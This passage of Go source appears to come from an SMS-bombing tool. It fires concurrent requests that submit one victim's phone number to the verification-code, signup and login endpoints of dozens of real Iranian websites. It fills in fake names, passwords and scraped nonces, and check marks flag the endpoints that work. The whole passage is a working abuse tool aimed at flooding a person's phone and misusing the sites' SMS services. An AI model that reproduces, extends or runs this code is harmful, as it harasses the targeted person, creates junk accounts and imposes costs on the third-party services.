				formData.Set("switchToOTP", "true")  
				sendFormRequest(c, ctx, "https://gama.ir/api/v1/users/login", formData, &wg, ch)
			}
		}(client)
                // naabshop.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("login_digt_countrycode", "+98")
				formData.Set("digits_phone", formatPhoneWithSpaces(phone)) 
				formData.Set("action_type", "phone")
				formData.Set("digits_reg_name", "testname") 
				formData.Set("digits_reg_lastname", "testlastname") 
				formData.Set("digits_process_register", "1")
				formData.Set("sms_otp", "")
				formData.Set("otp_step_1", "1")
				formData.Set("signup_otp_mode", "1")
				formData.Set("rememberme", "1")
				formData.Set("digits", "1")
				formData.Set("instance_id", "27744fbc0c69e6e612567dd63636fde4") 
				formData.Set("action", "digits_forms_ajax")
				formData.Set("type", "login")
				formData.Set("digits_step_1_type", "")
				formData.Set("digits_step_1_value", "")
				formData.Set("digits_step_2_type", "")
				formData.Set("digits_step_2_value", "")
				formData.Set("digits_step_3_type", "")
				formData.Set("digits_step_3_value", "")
				formData.Set("digits_login_email_token", "")
				formData.Set("digits_redirect_page", "//naabshop.com/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") 
				formData.Set("digits_form", "28e10ee7bd")
				formData.Set("_wp_http_referer", "/?utm_medium=company_profile&utm_source=nazarkade.com&utm_campaign=domain_click") 
				formData.Set("show_force_title", "1")
				formData.Set("container", "digits_protected")
				formData.Set("sub_action", "sms_otp")

				sendFormRequest(c, ctx, "https://naabshop.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		//karnameh.com ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"phone_number": phone,
				}
				sendJSONRequest(c, ctx, "https://api-gw.karnameh.com/switch/api/auth/otp/send/", payload, &wg, ch)
			}
		}(client)
		// afrak.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"first_name": "تست نام", //ی
					"phone_number": phone, 
					"password": "testpassword123", 
					"code": "",
					"invite_id": "",
					"rules": true,
				}
				sendJSONRequest(c, ctx, "https://client.afrak.com/api/v1/pre-register", payload, &wg, ch)
			}
		}(client)
		//masterkala.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				serviceURL := "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp"
				payload := map[string]interface{}{
					"type": "sendotp",
					"phone": phone,
				}
				sendJSONRequest(c, ctx, serviceURL, payload, &wg, ch)
			}
		}(client)
		//iranous.com
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				serviceURL := "https://iranous.com/login?back=my-account"
				formData := url.Values{}
				formData.Set("back", "my-account") 
				formData.Set("username", phone) 
				formData.Set("id_customer", "")
				formData.Set("firstname", "testfirstname") 
				formData.Set("lastname", "testlastname") 
				formData.Set("password", "testpassword123") 
				formData.Set("action", "register") 
				formData.Set("ajax", "1")

				sendFormRequest(c, ctx, serviceURL, formData, &wg, ch)
			}
		}(client)
		// oldpanel.avalpardakht.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile":            phone, 
					"email":             "randomuser@example.com", 
					"password":          "SecurePass123!", 
					"rules":             true,
					"is_business":       0,
					"online_chat_token": "", 
				}
				sendJSONRequest(c, ctx, "https://oldpanel.avalpardakht.com/panel/api/v1/auth/register", payload, &wg, ch)
			}
		}(client)
		// digido.ir
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "register")
				formData.Set("username", phone) 
				formData.Set("ajax", "1")
				formData.Set("back", "https://digido.ir/?utm_medium=company_profile") 
				formData.Set("firstname", "Test")
				formData.Set("lastname", "User")
				formData.Set("email", "test@example.com") 
				formData.Set("password", "Password123")
				sendFormRequest(c, ctx, "https://digido.ir/login?back=https%3A%2F%2Fdigido.ir%2F%3Futm_medium%3Dcompany_profile", formData, &wg, ch)
			}
		}(client)
		//  api.nikpardakht.com
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile":       phone, 
					"type":         "natural",
					"endPointType": "v1/register",
				}
				sendJSONRequest(c, ctx, "https://api.nikpardakht.com/api/v1/register", payload, &wg, ch)
			}
		}(client)
		//takdoo.com
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "ehraz_sms_otp_phone_verify")
				formData.Set("phone_number", phone) 
				formData.Set("login_method", "code")
				sendFormRequest(c, ctx, "https://takdoo.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)
		// irangan.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("mobile", phone) 
				formData.Set("email", "")   
				sendFormRequest(c, ctx, "https://www.irangan.com/account/Account/GetUserIdentity", formData, &wg, ch)
			}
		}(client)
		//irancoral.ir 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "eh_send_code")
				formData.Set("phone_number", phone) 
				formData.Set("login_method", "code")
				sendFormRequest(c, ctx, "https://irancoral.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)
		//  api.fidibo.com
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"username": "98-" + getPhoneNumberNoZero(phone), 
				}
				sendJSONRequest(c, ctx, "https://api.fidibo.com/identity/login/prepare", payload, &wg, ch)
			}
		}(client)

		// apigateway.fadaktrains.com  ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"phoneNumber": phone, 
				}
				sendJSONRequest(c, ctx, "https://apigateway.fadaktrains.com/api/auth/otp", payload, &wg, ch)
			}
		}(client)
		//  api.faradars.org (POST JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile":    phone, 
					"digits":    5,
					"platforms": "web",
					"source":    "faradars",
				}
				sendJSONRequest(c, ctx, "https://api.faradars.org/api/client/v1/auth/otp", payload, &wg, ch)
			}
		}(client)

		// hoseinifinance.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("amzshyar_account_ajax", "true")
				formData.Set("key", "auth")
				formData.Set("level", "first")
				formData.Set("r", "%2F")
				formData.Set("phone", getPhoneNumberNoZero(phone)) 
				sendFormRequest(c, ctx, "https://hoseinifinance.com/?amzshyar_account_ajax=true", formData, &wg, ch)
			}
		}(client)

		//  toprayan.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("Step", "EnterMobile")
				formData.Set("Mobile", phone)
				formData.Set("Password", "")    
				formData.Set("RememberMe", "false")
				formData.Set("VerifyCode", "")
				formData.Set("X-Requested-With", "XMLHttpRequest")
				sendFormRequest(c, ctx, "https://toprayan.com/account/login", formData, &wg, ch)
			}
		}(client)

		//  iraanbaba.com (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"phone": phone, 
				}
				sendJSONRequest(c, ctx, "https://iraanbaba.com/api/v1/users/check-phone", payload, &wg, ch)
			}
		}(client)


		// sanjagh.pro (POST JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"cell": phone,
				}
				sendJSONRequest(c, ctx, "https://sanjagh.pro/reborn-api/exp/api/session/v2/registerCell", payload, &wg, ch)
			}
		}(client)
	        // Telewebion ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"code":      "98",
					"phone":     getPhoneNumberNoZero(phone), 
					"smsStatus": "default",
				}
				sendJSONRequest(c, ctx, "https://gateway.telewebion.com/shenaseh/api/v2/auth/step-one", payload, &wg, ch)
			}
		}(client)
		//  zarinplus.com (JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://api.zarinplus.com/user/otp/", map[string]interface{}{
					"phone_number": getPhoneNumber98NoZero(phone), 
					"source": "zarinplus",
				}, &wg, ch)
			}
		}(client)
		// api.abantether.com (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
					"phone_number": formatPhoneWithSpaces(phone),
				}, &wg, ch)
			}
		}(client)
		// mrbilit.ir (OTP - GET)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				urlWithParam := fmt.Sprintf("https://auth.mrbilit.ir/api/Token/send?mobile=%s", phone)
				sendGETRequest(c, ctx, urlWithParam, &wg, ch)
			}
		}(client) 

		// bitpin.org (Authenticate - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"device_type": "web",
					"password":    "guhguihifgov3",
					"phone":       phone, 
				}
				sendJSONRequest(c, ctx, "https://api.bitpin.org/v3/usr/authenticate/", payload, &wg, ch)
			}
		}(client) 

		// wisgoon.com (Login - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				payload := map[string]interface{}{
					"phone":              phone,
					"token":              "e622c330c77a17c8426e638d7a85da6c2ec9f455AbCode",
					"recaptcha-response": "03AFc...",
				}
				sendJSONRequest(c, ctx, "https://gateway.wisgoon.com/api/v1/auth/login/", payload, &wg, ch)
			}
		}(client) 
		// balad.ir - POST JSON
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"phone_number": phone, 
					"os_type":      "W",
				}
				sendJSONRequest(c, ctx, "https://account.api.balad.ir/api/web/auth/login/", payload, &wg, ch)
			}
		}(client)

	        //(Tapsi) - POST JSON
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"credential": map[string]interface{}{
						"phoneNumber": phone, 
						"role":        "PASSENGER",
					},
				}
				sendJSONRequest(c, ctx, "https://tap33.me/api/v2/user", payload, &wg, ch)
			}
		}(client)

		// (Torob) - GET ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				torobURL := fmt.Sprintf("https://api.torob.com/a/phone/send-pin/?phone_number=%s", getPhoneNumberNoZero(phone)) 
				sendGETRequest(c, ctx, torobURL, &wg, ch)
			}
		}(client)


		// (DrNext) - POST JSON ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"source": "besina",
					"mobile": phone, 
				}
				sendJSONRequest(c, ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", payload, &wg, ch)
			}
		}(client)

		// drnext.ir (JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client) 
		// skmei-iran.com ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("email", phone) 
				sendFormRequest(c, ctx, "https://skmei-iran.com/api/customer/member/register/", formData, &wg, ch)
			}
		}(client)
		// hoomangold.com panel (Login/OTP - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("endp", "step-2") 
				formData.Set("redirect_to", "") 
				formData.Set("action", "nirweb_panel_login_form") 
				formData.Set("nirweb_panel_username", phone) 
				sendFormRequest(c, ctx, "https://hoomangold.com/panel/?endp=step-2", formData, &wg, ch)
			}
		}(client)
		// gateway.joordaroo.com request-otp (OTP - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile": phone, 
				}
				sendJSONRequest(c, ctx, "https://gateway.joordaroo.com/lgc/v1/auth/request-otp", payload, &wg, ch)
			}
		}(client)
		// vitrin.shop
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"phone_number": phone, 
					"forgot_password": false, 
				}
				sendJSONRequest(c, ctx, "https://www.vitrin.shop/api/v1/user/request_code", payload, &wg, ch)
			}
		}(client)
		// titomarket.com
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("route", "extension/websky_otp/module/websky_otp.send_code") 
				formData.Set("emailsend", "0") 
				formData.Set("telephone", phone) 
				sendFormRequest(c, ctx, "https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.send_code&emailsend=0", formData, &wg, ch)
			}
		}(client)
		// dolichi.com (Login/Register - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("back", "my-account")
				formData.Set("username", phone)
				formData.Set("id_customer", "") 
				formData.Set("firstname", "نام")
				formData.Set("lastname", "خانوادگی") 
				formData.Set("email", "example@example.com") 
				formData.Set("password", "1234567890") 
				formData.Set("action", "register") 
				formData.Set("ajax", "1") 
				sendFormRequest(c, ctx, "https://www.dolichi.com/login?back=my-account", formData, &wg, ch)
			}
		}(client)
		// pirankalaco.ir (OTP - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("phone", phone) 
				sendFormRequest(c, ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch)
			}
		}(client)
		// narsisbeauty.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("phone_number", phone) 
				formData.Set("wupp_remember_me", "on") 
				formData.Set("action", "wupp_sign_up") 
				sendFormRequest(c, ctx, "https://narsisbeauty.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)
		// davidjonesonline.ir login_request (Login/OTP - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile_phone": phone, 
				}
				sendJSONRequest(c, ctx, "https://davidjonesonline.ir/api/v1/sessions/login_request", payload, &wg, ch)
			}
		}(client)
		// api.123kif.com Register (Registration/OTP - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile": phone, 
					"password": "testpassword123", 
					"firstName": "Test", 
					"lastName": "User", 
					"platform": "web", 
					"refferCode": "", 
				}
				sendJSONRequest(c, ctx, "https://api.123kif.com/api/auth/Register", payload, &wg, ch)
			}
		}(client)
		// bimebazar.com login_sec (OTP - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"username": phone, 
					"type": "sms", 
				}
				sendJSONRequest(c, ctx, "https://bimebazar.com/accounts/api/login_sec/", payload, &wg, ch)
			}
		}(client)

		// microele.com (Registration - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("id_customer", "")
				formData.Set("back", ",my-account")
				formData.Set("firstname", "123")
				formData.Set("lastname", "123")
				formData.Set("password", "123456")
				formData.Set("action", "register")
				formData.Set("username", phone)
				formData.Set("ajax", "1")
				sendFormRequest(c, ctx, "https://www.microele.com/login?back=my-account", formData, &wg, ch) // ارسال c
			}
		}(client) 

		// telketab.com (POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() { 
				formData := url.Values{}
				formData.Set("identity", phone)
				formData.Set("secret", "")
				formData.Set("plugin", "otp_field_sms_processor")
				formData.Set("key", "otp_field_user_auth_form__otp_sms")
				sendFormRequest(c, ctx, "https://telketab.com/opt_field/check_secret", formData, &wg, ch) // ارسال c
			}
		}(client) 

		// techsiro.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("client", "web")
				formData.Set("method", "POST")
				formData.Set("_token", "")
				formData.Set("mobile", phone)
				sendFormRequest(c, ctx, "https://techsiro.com/send-otp", formData, &wg, ch) 
			}
		}(client) 

		// shimashoes.com (Registration - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("email", phone)
				sendFormRequest(c, ctx, "https://shimashoes.com/api/customer/member/register/", formData, &wg, ch) // ارسال c
			}
		}(client) 

		// eaccount.ir (SMS - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				payload := map[string]interface{}{
					"mobile_phone": phone,
				}
				sendJSONRequest(c, ctx, "https://eaccount.ir/api/v1/sessions/login_request", payload, &wg, ch) // ارسال c
			}
		}(client) 

		// queenaccessories.ir (SMS - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				payload := map[string]interface{}{
					"mobile_phone": phone,
				}
				sendJSONRequest(c, ctx, "https://queenaccessories.ir/api/v1/sessions/login_request", payload, &wg, ch) // ارسال c
			}
		}(client) 
		// vinaaccessory.com (SMS - POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				payload := map[string]interface{}{
					"mobile_phone": phone,
				}
				sendJSONRequest(c, ctx, "https://vinaaccessory.com/api/v1/sessions/login_request", payload, &wg, ch) // ارسال c
			}
		}(client) 

		// dastaneman.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formattedPhone := "0098" + getPhoneNumberNoZero(phone)
				formData.Set("mobile", formattedPhone)
				sendFormRequest(c, ctx, "https://dastaneman.com/User/SendCode", formData, &wg, ch) // ارسال c
			}
		}(client)

		// gitamehr.ir (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action", "mreeir_send_sms")
				formData.Set("mobileemail", phone)
				formData.Set("userisnotauser", "")
				formData.Set("type", "mobile")
				formData.Set("captcha", "")
				formData.Set("captchahash", "")
				formData.Set("security", "75d313bc3e")
				sendFormRequest(c, ctx, "https://gitamehr.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 

		// 4hair.ir (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action", "mreeir_send_sms")
				formData.Set("mobileemail", phone)
				formData.Set("userisnotauser", "")
				formData.Set("type", "mobile")
				formData.Set("captcha", "")
				formData.Set("captchahash", "")
				formData.Set("security", "52771e6d1a")
				sendFormRequest(c, ctx, "https://4hair.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 
		// titomarket.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("route", "extension/websky_otp/module/websky_otp.send_code")
				formData.Set("emailsend", "0")
				formData.Set("telephone", phone)
				sendFormRequest(c, ctx, "https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.send_code&emailsend=0", formData, &wg, ch) 
			}
		}(client) 

		// account724.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action", "stm_login_register")
				formData.Set("type", "mobile")
				formData.Set("input", phone)
				sendFormRequest(c, ctx, "https://account724.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 

		// api-atlasmode.alochand.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("version", "new2")
				formData.Set("mobile", phone)
				formData.Set("sdlkjcvisl", "uikjdknfs")
				sendFormRequest(c, ctx, "https://api-atlasmode.alochand.com/v1/customer/register-login?version=new2", formData, &wg, ch) // ارسال c
			}
		}(client)
		// api.pashikshoes.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("mobile", phone)
				formData.Set("sdlkjcvisl", "uikjdknfs")
				sendFormRequest(c, ctx, "https://api.pashikshoes.com/v1/customer/register-login", formData, &wg, ch) 
			}
		}(client)

		// api.paaakar.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("version", "new1")
				formData.Set("mobile", phone)
				formData.Set("sdlkjcvisl", "uikjdknfs")
				sendFormRequest(c, ctx, "https://api.paaakar.com/v1/customer/register-login?version=new1", formData, &wg, ch) 
			}
		}(client)

		// api.elinorboutique.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("mobile", phone)
				formData.Set("sdlkjcvisl", "uikjdknfs")
				sendFormRequest(c, ctx, "https://api.elinorboutique.com/v1/customer/register-login", formData, &wg, ch) 
			}
		}(client) 

		// benedito.ir (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("version", "new1")
				formData.Set("mobile", phone)
				formData.Set("sdvssd45fsdv", "brtht33yjuj7s")
				sendFormRequest(c, ctx, "https://api.benedito.ir/v1/customer/register-login?version=new1", formData, &wg, ch) 
			}
		}(client) 

		// zzzagros.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "awsa-login-with-phone-send-code")
				formData.Set("nonce", "9a4e9547c3")
				formData.Set("username", phone)
				sendFormRequest(c, ctx, "https://www.zzzagros.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 

		// janebi.com (SMS - POST Form) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("csrf", "4")
				formData.Set("user_mobile", phone)
				formData.Set("confirm_code", "")
				formData.Set("popup", "1")
				formData.Set("signin", "1")
				sendFormRequest(c, ctx, "https://janebi.com/signin", formData, &wg, ch) 
			}
		}(client)

		// ubike.ir (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action", "logini_first")
				formData.Set("login", phone)
				sendFormRequest(c, ctx, "https://ubike.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 

		// www.kanoonbook.ir (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("task", "customer_phone")
				formData.Set("customer_username", phone)
				sendFormRequest(c, ctx, "https://www.kanoonbook.ir/store/customer_otp", formData, &wg, ch) 
			}
		}(client)

		// chechilas.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("mob", getPhoneNumberNoZero(phone))
				formData.Set("code", "")
				formData.Set("referral_code", "")
				sendFormRequest(c, ctx, "https://chechilas.com/user/login", formData, &wg, ch) 
			}
		}(client)

		// https://admin.zoodex.ir/api/v2/login/check?need_sms=1 (JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				sendJSONRequest(c, ctx, "https://admin.zoodex.ir/api/v2/login/check?need_sms=1", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client) 

		// https://api6.arshiyaniha.com/api/v2/client/otp/send (JSON) -
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://api6.arshiyaniha.com/api/v2/client/otp/send", map[string]interface{}{
					"cellphone": "0" + getPhoneNumber98NoZero(phone),
					"country_code": "98",
				}, &wg, ch)
			}
		}(client)

		// https://poltalk.me/api/v1/auth/phone (JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://poltalk.me/api/v1/auth/phone", map[string]interface{}{ 
					"phone": phone,
				}, &wg, ch)
			}
		}(client) 

		// https://refahtea.ir/wp-admin/admin-ajax.php (Form Data)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action", "refah_send_code")
				formData.Set("mobile", phone)
				formData.Set("security", "placeholder")

				sendFormRequest(c, ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 
		// https://www.drsaina.com/ (GET) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				urlWithPhone := fmt.Sprintf("https://www.drsaina.com/api/v1/authentication/user-exist?PhoneNumber=%s", phone)
				sendGETRequest(c, ctx, urlWithPhone, &wg, ch) 
			}
		}(client) 

		// https://api.snapp.doctor/ ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				urlWithPhone := fmt.Sprintf("https://api.snapp.doctor/core/Api/Common/v1/sendVerificationCode/%s/sms?cCode=+98", phone)
				sendGETRequest(c, ctx, urlWithPhone, &wg, ch) 
			}
		}(client) 

		// https://pirankalaco.ir/SendPhone.php (Form Data)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("phone", phone)
				sendFormRequest(c, ctx, "https://pirankalaco.ir/SendPhone.php", formData, &wg, ch) 
			}
		}(client) 

		// https://gharar.ir/users/phone_number/ (Form Data) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("phone", phone)
				sendFormRequest(c, ctx, "https://gharar.ir/users/phone_number/", formData, &wg, ch) 
			}
		}(client)

		// https://www.irantic.com/api/login/authenticate (JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				sendJSONRequest(c, ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{ 
					"mobile": phone,
				}, &wg, ch)
			}
		}(client) 

		// gifkart.com (SMS - POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("PhoneNumber", phone)
				sendFormRequest(c, ctx, "https://gifkart.com/request/", formData, &wg, ch) 
			}
		}(client) 

		// mediana.ir (POST JSON) ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				payload := map[string]interface{}{
					"phone":    phone,
					"referrer": "",
				}
				sendJSONRequest(c, ctx, "https://app.mediana.ir/api/account/AccountApi/CreateOTPWithPhone", payload, &wg, ch)
			}
		}(client) 

		// lintagame.com (POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("action", "logini_first")
				formData.Set("login", phone)
				sendFormRequest(c, ctx, "https://lintagame.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client) 
		// account.api.balad.ir (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				payload := map[string]interface{}{
					"phone_number": phone,
					"os_type":      "W",
				}
				sendJSONRequest(c, ctx, "https://account.api.balad.ir/api/web/auth/login/", payload, &wg, ch) 
			}
		}(client)

		// core-api.mayava.ir (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				payload := map[string]interface{}{
					"mobile": phone,
				}
				sendJSONRequest(c, ctx, "https://core-api.mayava.ir/auth/check", payload, &wg, ch) 
			}
		}(client)

		// pgemshop.com (POST Form)
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{}
				formData.Set("action", "digits_check_mob")
				formData.Set("countrycode", "+98")
				formData.Set("mobileNo", phone)
				formData.Set("csrf", "0a60a620d9")
				formData.Set("login", "2")
				formData.Set("username", "")
				formData.Set("email", "")
				formData.Set("captcha", "")
				formData.Set("captcha_ses", "")
				formData.Set("json", "1")
				formData.Set("whatsapp", "0")
				sendFormRequest(c, ctx, "https://pgemshop.com/wp-admin/admin-ajax.php", formData, &wg, ch) 
			}
		}(client) 

		// api.cafebazaar.ir (POST JSON)
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				payload := map[string]interface{}{
					"properties": map[string]interface{}{
						"language":      2,
						"clientID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx",
						"clientVersion": "web",
						"deviceID":      "56uuqlpkg8ac0obfqk09jtoylc7grssx",
					},
					"singleRequest": map[string]interface{}{
						"getOtpTokenRequest": map[string]interface{}{
							"username": getPhoneNumber98NoZero(phone),
						},
					},
				}
				sendJSONRequest(c, ctx, "https://api.cafebazaar.ir/rest-v1/process/GetOtpTokenRequest", payload, &wg, ch) 
			}
		}(client) 

		// harikashop.com
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("id_customer", "")
				formData.Set("firstname", "Test")
				formData.Set("lastname", "User")
				formData.Set("password", "TestPass123")
				formData.Set("action", "register")
				formData.Set("username", phone)
				formData.Set("ajax", "1")
				sendFormRequest(c, ctx, "https://harikashop.com/login?back=https%3A%2F%2Fharikashop.com%2F", formData, &wg, ch) 
			}
		}(client) 

		// digistyle.com 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("loginRegister[email_phone]", phone)
				sendFormRequest(c, ctx, "https://www.digistyle.com/users/login-register/", formData, &wg, ch) 
			}
		}(client) 

		// api.nobat.ir ✅ 
		wg.Add(1)
		tasks <- func(c *http.Client) func() { 
			return func() {
				formData := url.Values{}
				formData.Set("mobile", phone[1:])
				formData.Set("use_emta_v2", "yes")
